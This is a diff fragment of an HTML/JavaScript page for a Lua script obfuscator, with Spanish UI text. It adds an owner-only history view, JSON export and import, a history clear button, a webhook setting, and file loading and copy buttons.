+    const fLen = e.obfLen || (e.obfuscated||'').length;
+    return `<div class="hist-item" data-id="${safeId}">
+      <div class="meta">
+        <span class="${roleClass}"><strong>${roleLabel}</strong></span>
+        <span>${escapeHtml(date)}</span>
+        <span>${e.before} B → ${e.after} B</span>
+        <span>orig ${oLen} / obf ${fLen} chars</span>
+      </div>
+      <div class="preview">${escapeHtml(e.preview || '')}</div>
+      <div class="row-btns">
+        <button type="button" class="ghost small" data-act="obf" data-id="${safeId}">Ofuscado .txt</button>
+        <button type="button" class="ghost small" data-act="orig" data-id="${safeId}">Original .txt</button>
+        <button type="button" class="ghost small" data-act="view-obf" data-id="${safeId}">Ver ofuscado</button>
+        <button type="button" class="ghost small" data-act="view-orig" data-id="${safeId}">Ver original</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+async function openHistory(){
+  if(currentRole !== 'owner') return;
+  histFilter = 'all';
+  document.querySelectorAll('.hist-filters button').forEach(b => {
+    b.classList.toggle('active', b.dataset.filter === 'all');
+  });
+  $('ownerSettings').style.display = 'none';
+  await renderHistory();
+  $('histModal').classList.add('open');
+}
+function closeHistory(){ $('histModal').classList.remove('open'); }
+
+$('histBtn').addEventListener('click', (e) => { e.preventDefault(); openHistory(); });
+$('histClose').addEventListener('click', (e) => { e.preventDefault(); closeHistory(); });
+$('histModal').addEventListener('click', (e) => { if(e.target === $('histModal')) closeHistory(); });
+document.querySelectorAll('.hist-filters button').forEach(btn => {
+  btn.addEventListener('click', async (e) => {
+    e.preventDefault();
+    histFilter = btn.dataset.filter;
+    document.querySelectorAll('.hist-filters button').forEach(b => b.classList.toggle('active', b === btn));
+    await renderHistory();
+  });
+});
+$('histExport').addEventListener('click', async (e) => {
+  e.preventDefault();
+  const all = await historyGetAll();
+  const blob = new Blob([JSON.stringify(all, null, 2)], { type: 'application/json' });
+  const stamp = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
+  const name = `obfuscations_backup_${stamp}.json`;
+  try{
+    const file = new File([blob], name, { type: 'application/json' });
+    if(navigator.canShare && navigator.canShare({ files: [file] })){
+      try{ await navigator.share({ files: [file], title: name }); return; }catch(err){ if(err && err.name==='AbortError') return; }
+    }
+  }catch(err){}
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = name; a.style.display='none';
+  document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 2000);
+  openView(name, JSON.stringify(all, null, 2));
+});
+
+$('histImport').addEventListener('click', (e) => {
+  e.preventDefault();
+  $('histImportFile').click();
+});
+
+$('histImportFile').addEventListener('change', async (e) => {
+  const file = e.target.files && e.target.files[0];
+  e.target.value = '';
+  if(!file) return;
+  try{
+    const textData = await file.text();
+    const arr = JSON.parse(textData);
+    if(!Array.isArray(arr)) throw new Error('JSON no es una lista');
+    let n = 0;
+    for(const entry of arr){
+      if(!entry || !entry.id) continue;
+      await historyAdd(entry);
+      n++;
+    }
+    alert('Importadas ' + n + ' entradas.');
+    await renderHistory();
+  }catch(err){
+    alert('No se pudo importar: ' + (err.message || err));
+  }
+});
+
+$('histClear').addEventListener('click', async (e) => {
+  e.preventDefault();
+  if(!confirm('¿Borrar TODO el historial de este dispositivo? No se puede deshacer. (Discord no se borra)')) return;
+  await historyClear();
+  await renderHistory();
+});
+$('webhookUrl').addEventListener('change', () => setWebhook($('webhookUrl').value.trim()));
+$('webhookUrl').addEventListener('blur', () => setWebhook($('webhookUrl').value.trim()));
+
+$('histList').addEventListener('click', async (e) => {
+  const btn = e.target.closest('button[data-act]');
+  if(!btn) return;
+  e.preventDefault();
+  const id = btn.dataset.id;
+  const act = btn.dataset.act;
+  let all = [];
+  try{ all = await historyGetAll(); }catch(err){}
+  const entry = all.find(x => String(x.id).replace(/[^a-zA-Z0-9_-]/g,'') === id || x.id === id);
+  if(!entry) return;
+  const stamp = (entry.ts || '').replace(/[:.]/g,'-').slice(0,19);
+  const roleTag = entry.role === 'owner' ? 'owner' : 'user';
+  if(act === 'obf') shareOrDownload(`obfuscated_${roleTag}_${stamp}.txt`, entry.obfuscated || '');
+  else if(act === 'orig') shareOrDownload(`original_${roleTag}_${stamp}.txt`, entry.original || '');
+  else if(act === 'view-obf') openView(`obfuscated_${roleTag}_${stamp}.txt`, entry.obfuscated || '');
+  else if(act === 'view-orig') openView(`original_${roleTag}_${stamp}.txt`, entry.original || '');
+});
+
+$('viewClose').addEventListener('click', (e) => { e.preventDefault(); closeView(); });
+$('viewModal').addEventListener('click', (e) => { if(e.target === $('viewModal')) closeView(); });
+$('viewCopy').addEventListener('click', async (e) => {
+  e.preventDefault();
+  try{
+    await navigator.clipboard.writeText(viewPayload.text || $('viewText').value);
+    const b = $('viewCopy'); const t = b.textContent; b.textContent = '¡Copiado!';
+    setTimeout(() => b.textContent = t, 1200);
+  }catch(err){
+    $('viewText').focus(); $('viewText').select();
+    try{ document.execCommand('copy'); }catch(_){}
+  }
+});
+$('viewShare').addEventListener('click', (e) => {
+  e.preventDefault();
+  shareOrDownload(viewPayload.name || 'script.txt', viewPayload.text || $('viewText').value);
+});
+
+$('runBtn').addEventListener('click', (e) => { e.preventDefault(); run(); });
+$('pwSubmit').addEventListener('click', (e) => { e.preventDefault(); tryLogin(); });
+$('pwInput').addEventListener('keydown', (e) => { if(e.key === 'Enter'){ e.preventDefault(); tryLogin(); } });
+$('copyBtn').addEventListener('click', async (e) => {
+  e.preventDefault();
+  try{
+    await navigator.clipboard.writeText($('input').value);
+    const b=$('copyBtn'); const t=b.textContent; b.textContent='¡Copiado!'; setTimeout(()=>b.textContent=t,1200);
+  }catch(err){}
+});
+$('dlNowBtn').addEventListener('click', (e) => {
+  e.preventDefault();
+  if(!lastObfuscated) return;
+  const stamp = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
+  shareOrDownload(`obfuscated_${currentRole||'user'}_${stamp}.txt`, lastObfuscated);
+});
+$('exampleBtn').addEventListener('click', (e) => { e.preventDefault(); $('fileInput').click(); });
+$('fileInput').addEventListener('change', (e) => {
+  const file = e.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = () => {
+    $('panelLabel').textContent = 'Tu script (.lua)';
+    $('copyBtn').style.display = 'none';
+    $('dlNowBtn').style.display = 'none';
+    $('input').value = reader.result;
+    lastFileName = file.name || 'script';
+    $('stats').textContent = `Cargado: ${file.name} (${file.size} B)`;
+  };
+  reader.onerror = () => { $('stats').textContent = 'No se pudo leer el archivo.'; };
+  reader.readAsText(file);
+  e.target.value = '';
+});
+</script>
+</body>
+</html>
